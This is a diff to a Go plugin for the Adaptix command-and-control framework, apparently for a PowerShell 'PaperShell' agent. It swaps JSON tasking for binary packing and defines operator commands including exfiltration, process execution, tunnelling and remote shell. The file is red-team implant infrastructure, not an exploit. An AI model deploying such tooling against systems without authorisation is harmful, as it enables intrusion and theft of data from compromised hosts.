@@ -1,119 +1,128 @@
 package main
 
 import (
+	"encoding/binary"
 	"encoding/json"
 	"errors"
 	"fmt"
-	"net"
-	"os"
+	"strconv"
 	"strings"
+	"time"
 
-	adaptix "github.com/Adaptix-Framework/axc2"
+	"github.com/Adaptix-Framework/axc2"
 )
 
-func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
-	return nil, nil
-}
+const (
+	OS_UNKNOWN = 0
+	OS_WINDOWS = 1
+	OS_LINUX   = 2
+	OS_MAC     = 3
 
-func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
-	var (
-		Filename     string
-		buildContent []byte
-	)
+	TYPE_TASK       = 1
+	TYPE_BROWSER    = 2
+	TYPE_JOB        = 3
+	TYPE_TUNNEL     = 4
+	TYPE_PROXY_DATA = 5
 
-	// Получаем нужные параметры подключения
-	callbackHost, callbackPort, _ := net.SplitHostPort(strings.TrimSpace(listenerMap["callback_address"].(string)))
+	MESSAGE_INFO    = 5
+	MESSAGE_ERROR   = 6
+	MESSAGE_SUCCESS = 7
 
-	// Собираем агента
-	currentDir := ModuleDir
-	Filename = "agent.ps1"
+	DOWNLOAD_STATE_RUNNING  = 1
+	DOWNLOAD_STATE_STOPPED  = 2
+	DOWNLOAD_STATE_FINISHED = 3
+	DOWNLOAD_STATE_CANCELED = 4
+)
 
-	agentContentBytes, err := os.ReadFile(currentDir + "/src_papershell/agent.ps1")
-	if err != nil {
-		return nil, "", err
-	}
+const (
+	COMMAND_CAT          = 24
+	COMMAND_COPY         = 12
+	COMMAND_CD           = 8
+	COMMAND_DISKS        = 15
+	COMMAND_DOWNLOAD     = 32
+	COMMAND_EXEC_BOF     = 50
+	COMMAND_EXEC_BOF_OUT = 51
+	COMMAND_EXFIL        = 35
+	COMMAND_GETUID       = 22
+	COMMAND_JOBS_KILL    = 47
+	COMMAND_JOB_LIST     = 46
+	COMMAND_LINK         = 38
+	COMMAND_LS           = 14
+	COMMAND_MV           = 18
+	COMMAND_MKDIR        = 27
+	COMMAND_PIVOT_EXEC   = 37
+	COMMAND_PS_LIST      = 41
+	COMMAND_PS_KILL      = 42
+	COMMAND_PS_RUN       = 43
+	COMMAND_PROFILE      = 21
+	COMMAND_PWD          = 4
+	COMMAND_REV2SELF     = 23
+	COMMAND_RM           = 17
+	COMMAND_RUN			 = 6
+	COMMAND_TERMINATE    = 10
+	COMMAND_UNLINK       = 39
+	COMMAND_UPLOAD       = 33
 
-	agentContent := string(agentContentBytes)
+	COMMAND_TUNNEL_START_TCP = 62
+	COMMAND_TUNNEL_START_UDP = 63
+	COMMAND_TUNNEL_WRITE_TCP = 64
+	COMMAND_TUNNEL_WRITE_UDP = 65
+	COMMAND_TUNNEL_CLOSE     = 66
+	COMMAND_TUNNEL_REVERSE   = 67
+	COMMAND_TUNNEL_ACCEPT    = 68
+	COMMAND_TUNNEL_PAUSE     = 69
+	COMMAND_TUNNEL_RESUME    = 70
 
-	agentContent = strings.ReplaceAll(agentContent, "<CALLBACK_HOST>", callbackHost)
-	agentContent = strings.ReplaceAll(agentContent, "<CALLBACK_PORT>", callbackPort)
-	agentContent = strings.ReplaceAll(agentContent, "<WATERMARK>", AgentWatermark)
+	COMMAND_SHELL_START  = 71
+	COMMAND_SHELL_WRITE  = 72
+	COMMAND_SHELL_CLOSE  = 73
+	COMMAND_SHELL_ACCEPT = 74
 
-	buildContent = []byte(agentContent)
-
-	return buildContent, Filename, nil
-}
-
-type InitialData struct {
-	Domain     string `json:"domain"`
-	Username   string `json:"username"`
-	Computer   string `json:"computer"`
-	InternalIP string `json:"internal_ip"`
-}
-
-func CreateAgent(initialData []byte) (adaptix.AgentData, error) {
-	var agentData adaptix.AgentData
-
-	fmt.Printf("res: %v\n", initialData)
-
-	var parsedData InitialData
-	err := json.Unmarshal(initialData, &parsedData)
-	if err != nil {
-		return agentData, err
-	}
-
-	// Fill data: domain, computer, username, internalip
-	agentData.Domain = parsedData.Domain
-	agentData.Username = parsedData.Username
-	agentData.Computer = parsedData.Computer
-	agentData.InternalIP = parsedData.InternalIP
-	agentData.Os = OS_WINDOWS
-
-	// Мы не шифруем данные
-	agentData.SessionKey = []byte("NULL")
-
-	return agentData, nil
-}
-
-func AgentEncryptData(data []byte, key []byte) ([]byte, error) {
-	return data, nil
-}
-
-func AgentDecryptData(data []byte, key []byte) ([]byte, error) {
-	return data, nil
-}
+	COMMAND_JOB        = 0x8437
+	COMMAND_SAVEMEMORY = 0x2321
+	COMMAND_ERROR      = 0x1111ffff
+)
 
 /// TASKS
+// PackTasks converts Adaptix TaskData array into agent-consumable format.
+// Called when the agent checks in to send pending tasks for execution.
+func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
 
-type AgentTaskData struct {
-	TaskId   string `json:"task_id"`
-	TaskData []byte `json:"task_data"`
-}
+	var packData []byte
 
-func PackTasks(agentData adaptix.AgentData, tasksArray []adaptix.TaskData) ([]byte, error) {
-	var tasks []AgentTaskData
+	/// START CODE HERE
 
-	for _, task := range tasksArray {
-		tasks = append(tasks, AgentTaskData{
-			TaskId:   task.TaskId,
-			TaskData: task.Data,
-		})
+	var (
+		array	[]interface{}
+		err		error
+	)
+
+	for _, taskData := range tasks {
+		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
+		if err != nil {
+			return nil, err
+		}
+		array = append(array, taskData.Data)
+		array = append(array, int(taskId))
 	}
 
-	packData, err := json.Marshal(tasks)
-
+	packData, err = PackArray(array)
 	if err != nil {
 		return nil, err
 	}
 
+	size := make([]byte, 4)
+	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
+	packData = append(size, packData...)
+
+	/// END CODE
+
 	return packData, nil
 }
 
-func PackPivotTasks(pivotId string, data []byte) ([]byte, error) {
-	return nil, errors.New("PaperShell agent does not support pivot yet")
-}
-
-func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
+// CreateTask converts user input from the UI into a task for the agent.
+// Called when an operator executes a command in the Adaptix console.
+func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
 	var (
 		taskData    adaptix.TaskData
 		messageData adaptix.ConsoleMessageData
@@ -127,137 +136,144 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 	// subcommand, _ := args["subcommand"].(string)
 
 	taskData = adaptix.TaskData{
-		Type: TYPE_TASK,
+		Type: adaptix.TASK_TYPE_TASK,
 		Sync: true,
 	}
 
 	messageData = adaptix.ConsoleMessageData{
-		Status: MESSAGE_INFO,
+		Status: adaptix.MESSAGE_INFO,
 		Text:   "",
 	}
 	messageData.Message, _ = args["message"].(string)
 
-	commandData := make(map[string]any)
+	/// START CODE HERE
 
-	commandData["command"] = command
+	var array []interface{}
 
 	switch command {
 	case "cat":
-		path, ok := args["path"].(string)
-		if !ok {
-			err = errors.New("paramter 'path' must be set")
+		var path string
+		path, err = getStringArg(args, "path")
+		if err != nil {
 			goto RET
 		}
-		commandData["path"] = path
+		array = []interface{}{COMMAND_CAT, Ts.TsConvertUTF8toCp(path, agentData.ACP)}
 	case "cd":
-		path, ok := args["path"].(string)
-		if !ok {
-			err = errors.New("parameter 'path' must be set")
+		var path string
+		path, err = getStringArg(args, "path")
+		if err != nil {
 			goto RET
 		}
-		commandData["path"] = path
+		array = []interface{}{COMMAND_CD, Ts.TsConvertUTF8toCp(path, agentData.ACP)}
 	case "ls":
-		// path is optional for ls, use current directory if not provided
-		if path, ok := args["path"].(string); ok {
-			commandData["path"] = path
+		var path string
+		path, _ = getStringArg(args, "path")	// If no path is provided, list current directory
+		if len(path) == 0 {
+			path = "."
 		}
-
+		array = []interface{}{COMMAND_LS, Ts.TsConvertUTF8toCp(path, agentData.ACP)}
 	case "run":
-		executable, ok := args["executable"].(string)
-		if !ok {
-			err = errors.New("parameter 'executable' must be set")
+		executable, err := getStringArg(args, "executable")
+		if err != nil {
 			goto RET
 		}
-		commandData["executable"] = executable
+		args, _ := args["args"].(string)
+		executable	 = Ts.TsConvertUTF8toCp(executable, agentData.ACP)
+		programArgs := Ts.TsConvertUTF8toCp(args, agentData.ACP)
 
-		if cmdArgs, ok := args["args"].(string); ok {
-			commandData["args"] = cmdArgs
+		if programArgs != "" {
+			array = []interface{}{COMMAND_RUN, executable, programArgs}
+		} else {
+			array = []interface{}{COMMAND_RUN, executable}
 		}
 	default:
 		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
 		goto RET
 	}
+	
+	taskData.Data, err = PackArray(array)
 
-	taskData.Data, err = json.Marshal(commandData)
-	if err != nil {
-		goto RET
-	}
+	/// END CODE
 
 RET:
 	return taskData, messageData, err
 }
 
 type ResultData struct {
-	Path    string `json:"path"`
-	Command string `json:"command"`
-	TaskId  string `json:"taskId"`
+	Path		string		`json:"path"`
+	Command		int			`json:"command"`
+	TaskId		int			`json:"taskId"`
 
 	// cat
-	Content []byte `json:"content,omitempty"`
+	Content		[]byte		`json:"content,omitempty"`
 
 	// cd
-	NewPath string `json:"new_path,omitempty"`
+	NewPath		string		`json:"new_path,omitempty"`
 
 	// ls
-	Files []FileInfo `json:"files,omitempty"`
+	Files		[]FileInfo	`json:"files,omitempty"`
 
 	// run
-	Executable string `json:"executable,omitempty"`
-	Args       string `json:"args,omitempty"`
-	Stdout     string `json:"stdout,omitempty"`
-	Stderr     string `json:"stderr,omitempty"`
-	ExitCode   int    `json:"exitCode,omitempty"`
+	Executable	string		`json:"executable,omitempty"`
+	Args		string		`json:"args,omitempty"`
+	Stdout		string		`json:"stdout,omitempty"`
+	Stderr		string		`json:"stderr,omitempty"`
+	ExitCode	int			`json:"exitCode,omitempty"`
 }
 
 type FileInfo struct {
-	Name          string `json:"Name"`
-	FullName      string `json:"FullName"`
-	IsDirectory   bool   `json:"IsDirectory"`
-	Length        *int64 `json:"Length,omitempty"`
-	LastWriteTime string `json:"LastWriteTime"`
+	Name			string		`json:"Name"`
+	FullName		string		`json:"FullName"`
+	IsDirectory		bool		`json:"IsDirectory"`
+	Length			*int64		`json:"Length,omitempty"`
+	LastWriteTime	string		`json:"LastWriteTime"`
 }
 
-func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData adaptix.TaskData, packedData []byte) []adaptix.TaskData {
+// ProcessData parses agent task responses and displays formatted output.
+// Called when agent sends back task execution results.
+func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
 	var outTasks []adaptix.TaskData
+
+	taskData := adaptix.TaskData{
+		Type:        adaptix.TASK_TYPE_TASK,
+		AgentId:     agentData.Id,
+		FinishDate:  time.Now().Unix(),
+		MessageType: adaptix.MESSAGE_SUCCESS,
+		Completed:   true,
+		Sync:        true,
+	}
+
+	/// START CODE
+
 	var resultData []ResultData
 
-	err := json.Unmarshal(packedData, &resultData)
+	err := json.Unmarshal(decryptedData, &resultData)
 	if err != nil {
-		return outTasks
+		fmt.Printf("err: %v\n", err)
+		goto HANDLER
 	}
 
 	for _, taskResult := range resultData {
+		task := taskData
+		task.TaskId = fmt.Sprintf("%08x", taskResult.TaskId)
+
 		command := taskResult.Command
 
 		switch command {
-		case "cat":
-			path := taskResult.Path
-			fileContent := taskResult.Content
-			task := taskData
-			task.TaskId = taskResult.TaskId
+		case COMMAND_CAT:
+			path := Ts.TsConvertCpToUTF8(taskResult.Path, agentData.ACP)
 			task.Message = fmt.Sprintf("'%v' file content:", path)
-			task.ClearText = string(fileContent)
-			outTasks = append(outTasks, task)
-		case "cd":
-			path := taskResult.Path
-			newPath := taskResult.NewPath
-			task := taskData
-			task.TaskId = taskResult.TaskId
+			task.ClearText = string(taskResult.Content)
+		case COMMAND_CD:
+			newPath := Ts.TsConvertCpToUTF8(taskResult.NewPath, agentData.ACP)
 			task.Message = fmt.Sprintf("Changed directory to: %s", newPath)
-			task.ClearText = fmt.Sprintf("Previous path: %s\nCurrent path: %s", path, newPath)
-			outTasks = append(outTasks, task)
-
-		case "ls":
-			path := taskResult.Path
-			files := taskResult.Files
-			task := taskData
-			task.TaskId = taskResult.TaskId
-			task.Message = fmt.Sprintf("Directory listing for: %s", path)
+		case COMMAND_LS:
+			path := Ts.TsConvertCpToUTF8(taskResult.Path, agentData.ACP)
+			task.Message = fmt.Sprintf("Directory listing for %s", path)
 
 			var output strings.Builder
-			output.WriteString(fmt.Sprintf("Contents of: %s\n\n", path))
-
-			for _, file := range files {
+			
+			for _, file := range taskResult.Files {
 				if file.IsDirectory {
 					output.WriteString(fmt.Sprintf("[DIR]  %s\n", file.Name))
 				} else {
@@ -268,98 +284,65 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 					output.WriteString(fmt.Sprintf("[FILE] %s (%s bytes)\n", file.Name, size))
 				}
 			}
-
 			task.ClearText = output.String()
-			outTasks = append(outTasks, task)
-		case "run":
-			executable := taskResult.Executable
-			args := taskResult.Args
-			stdout := taskResult.Stdout
-			stderr := taskResult.Stderr
-			exitCode := taskResult.ExitCode
+		case COMMAND_RUN:
+			executable	:= Ts.TsConvertCpToUTF8(taskResult.Executable, agentData.ACP)
+			args		:= Ts.TsConvertCpToUTF8(taskResult.Args, agentData.ACP)
+			stdout		:= Ts.TsConvertCpToUTF8(taskResult.Stdout, agentData.ACP)
+			stderr		:= Ts.TsConvertCpToUTF8(taskResult.Stderr, agentData.ACP)
 
-			task := taskData
-			task.TaskId = taskResult.TaskId
-			task.Message = fmt.Sprintf("Command executed: %s", executable)
+			task.Message = fmt.Sprintf("Command executed: %s %s (Exit code: %d)\n", executable, args, taskResult.ExitCode)
 
 			var output strings.Builder
-			output.WriteString(fmt.Sprintf("Executable: %s\n", executable))
-			if len(args) > 0 {
-				output.WriteString(fmt.Sprintf("Arguments: %v\n", args))
-			}
-			output.WriteString(fmt.Sprintf("Exit Code: %d\n\n", exitCode))
-
+			
 			if stdout != "" {
 				output.WriteString(fmt.Sprintf("STDOUT:\n%s\n", stdout))
 			}
+
 			if stderr != "" {
 				output.WriteString(fmt.Sprintf("STDERR:\n%s\n", stderr))
 			}
 
 			task.ClearText = output.String()
-			outTasks = append(outTasks, task)
 		default:
 			continue
 		}
+
+		outTasks = append(outTasks, task)
 	}
 
-	return outTasks
+HANDLER:
+
+	/// END CODE
+
+	for _, task := range outTasks {
+		Ts.TsTaskUpdate(agentData.Id, task)
+	}
+
+	return nil
 }
 
-/// TUNNELS
-
-func TunnelCreateTCP(channelId int, address string, port int) ([]byte, error) {
-	/// START CODE HERE
-	return nil, errors.New("Function Tunnel not supported")
-	/// END CODE HERE
+func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
+	/// START CODE
+	return data, nil
+	// return RC4Crypt(data, key)
+	/// END CODE
 }
 
-func TunnelCreateUDP(channelId int, address string, port int) ([]byte, error) {
-	/// START CODE HERE
-	return nil, errors.New("Function Tunnel not supported")
-	/// END CODE HERE
+func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
+	/// START CODE
+	return data, nil
+	/// END CODE
 }
 
-func TunnelWriteTCP(channelId int, data []byte) ([]byte, error) {
-	/// START CODE HERE
-	return nil, errors.New("Function Tunnel not supported")
-	/// END CODE HERE
+func (e *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
+	return adaptix.TaskData{}, fmt.Errorf("PivotPackData not implemented")
 }
 
-func TunnelWriteUDP(channelId int, data []byte) ([]byte, error) {
-	/// START CODE HERE
-	return nil, errors.New("Function Tunnel not supported")
-	/// END CODE HERE
+func (e *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
+	return adaptix.TunnelCallbacks{}
 }
 
-func TunnelClose(channelId int) ([]byte, error) {
-	/// START CODE HERE
-	return nil, errors.New("Function Tunnel not supported")
-	/// END CODE HERE
-}
-
-func TunnelReverse(tunnelId int, port int) ([]byte, error) {
-	/// START CODE HERE
-	return nil, errors.New("Function Tunnel not supported")
-	/// END CODE HERE
-}
-
-/// TERMINAL
-
-func TerminalStart(terminalId int, program string, sizeH int, sizeW int) ([]byte, error) {
-	/// START CODE HERE
-	return nil, errors.New("Function Remote Terminal not supported")
-	/// END CODE HERE
-}
-
-func TerminalWrite(terminalId int, data []byte) ([]byte, error) {
-	/// START CODE HERE
-	return nil, errors.New("Function Remote Terminal not supported")
-	/// END CODE HERE
-}
-
-func TerminalClose(terminalId int) ([]byte, error) {
-	/// START CODE HERE
-	return nil, errors.New("Function Remote Terminal not supported")
-	/// END CODE HERE
+func (e *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
+	return adaptix.TerminalCallbacks{}
 }
